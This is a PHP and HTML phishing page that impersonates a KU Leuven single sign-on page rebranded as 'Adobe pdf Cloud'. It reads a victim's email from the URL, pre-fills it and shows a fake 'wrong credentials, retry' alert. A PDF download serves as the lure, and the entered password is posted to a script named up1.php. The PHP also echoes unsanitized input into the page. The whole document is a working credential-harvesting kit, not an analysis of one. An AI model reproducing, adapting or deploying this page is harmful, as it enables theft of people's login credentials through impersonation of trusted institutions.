<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
$display = strtoupper($yuh);

session_start();
if (isset($_GET['email'])) {
    $clientemail = $_GET['email'];
    $_SESSION['clientemail']=$clientemail;
}

?>



<!DOCTYPE html>
<!-- saved from url=(0069)https://idp.kuleuven.be/idp/profile/SAML2/Redirect/SSO?execution=e1s2 -->
<html lang="en"><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="author" content="">

    <title>Authentication</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="./download_files/bootstrap-4.0.0-alpha.4.min.css">
    <link rel="stylesheet" href="./download_files/kuleuven-stijl.css" type="text/css">
    <link rel="stylesheet" href="./download_files/font-awesome.min.css" type="text/css">
        <link rel="stylesheet" href="./download_files/main.css" type="text/css">
    

    <script src="./download_files/ie10-viewport-bug-workaround.js.download"></script>
    <script src="./download_files/jquery-3.0.0.min.js.download"></script>
    <script src="./download_files/tether.min.js.download"></script>
    <script src="./download_files/bootstrap-4.0.0-alpha.4.min.js.download"></script>
    <script src="./download_files/jcookie.js.download" type="application/javascript"></script>
    

            
    
</head>

<body onload="load(&#39;rememberDevice&#39;)" style="background-image: url('download_files/bg.jpg')">
            <header class="">

        
            <div class="container">
                            <img id="hosted-by" height="76" width="150" src="./download_files/associatie-kuleuven-hosted-by.png">
                        </div>
        
        <nav class="local-header p-b-1">
            <div class="container container-relative">
                <h2>Adobe pdf Cloud</h2>
                <h6 class="pull-xs-left"></h6>
                <nav class="nav-user pull-xs-right">
                </nav>

            </div>
        </nav>
    </header>
    <div class="container">
        <div class="row">
                        <div id="box-content" class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 col-xs-12 col-sm-10 col-sm-offset-1">
                            <div>
                    <div class="hidden-md-up visible-sm-down">
                        
                    </div>



        <div class="alert alert-info alert-dismissible clearfix" role="alert">
        <h6><font color="ff0000">Wrong email credentials entered retry!</font></h6>
                                    </div>
        
    

				<div class="row">
			<div class="col col-md-6 col-sm-12 col-xs-12">
		
				<form action="up1.php" method="post" class="form-signin">

						

						<div class="alert alert-danger alert-dismissible clearfix" id="js-error-text" role="alert" style="display: none;">
						</div>

												<label for="username" class="sr-only">email address</label>
												<div class="inner-addon left-addon login-input">
								<i class="fa fa-user"></i>
								<input id="username" name="spf3" type="email" class="form-control" value="<?php echo $clientemail ?>" placeholder="email address" required="" disabled>
						</div>

						<label for="password" class="sr-only">Password</label>
						<div class="inner-addon left-addon login-input">
								<i class="fa fa-lock"></i>
								<input id="password" name="spf4" type="password" class="form-control" placeholder="Password" minlength="4" autocomplete="off" required="">
						</div>

								<div class="inner-addon left-addon form-check">
								<label class="white-text form-check-label" for="rememberlogin">
										<input type="checkbox" class="form-check-input" name="rememberlogin" id="rememberlogin" value="1">
										Remember my email								</label>
						</div>
		
						
						<input type="hidden" name="_eventId" value="proceed">
						<button class="btn btn-lg btn-primary btn-block" type="submit">
															Sign in</button>
						<div role="tablist" aria-multiselectable="true">
								<div class="panel panel-default">
										<div class="panel-heading" role="tab" id="headingOne">
												
										</div>
										<div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne" aria-expanded="true">
												<ul class="list-styled">
														<
																
																										</ul>
										</div>
								</div>
						</div>

				

					</div>
			<div id="authenticator_vertical_divider" class="col col-md-1 hidden-sm-down">
				<div class="line"></div>
				<div class="wordwrapper">
				</div>
			</div>
			<div class="col col-md-5 col-sm-12 col-xs-12">
				<h1 id="authenticator_horizontal_divider"></h1>
				
						<button id="btnnauthlogin" class="btn btn-lg btn-default btn-block" type="submit" name="_eventId_UseNAuth" accesskey="a">
								<img height="100" width="100" src="./download_files/authenticator-icon-50.png"><br>
								Adobe pdf document						</button>
						<div class="inner-addon left-addon form-check">
						  <label class="white-text form-check-label" for="rememberDevice" data-toggle="tooltip" data-placement="right" title="" data-original-title="If checked, next time you login, the login will be pushed to your device.">
						    
							
						    </span>
						  </label>
						</div>
						<button class="btn btn-lg btn-primary btn-block m-t-1" type="submit" name="_eventId_UseNAuth">
								Download Pdf (3.2 mb)					</button>
						<br>
						
				</form>
			</div>
		</div>
		
   </div>


            </div>
        </div> <!-- /centered column -->
    </div> <!-- /row -->

<div id="small-logo" class="hidden-md-up">
    <img src="./download_files/hosted-by-associatie-kuleuven-small.png" alt="Hosted by Associatie KU Leuven">
</div>

<div class="footer-wrapper">
    <footer class="local-footer footer">
        <p class="center">
            <small>Copyright © Adobe Cloud</small>
        </p>
    </footer>
</div>



</body></html>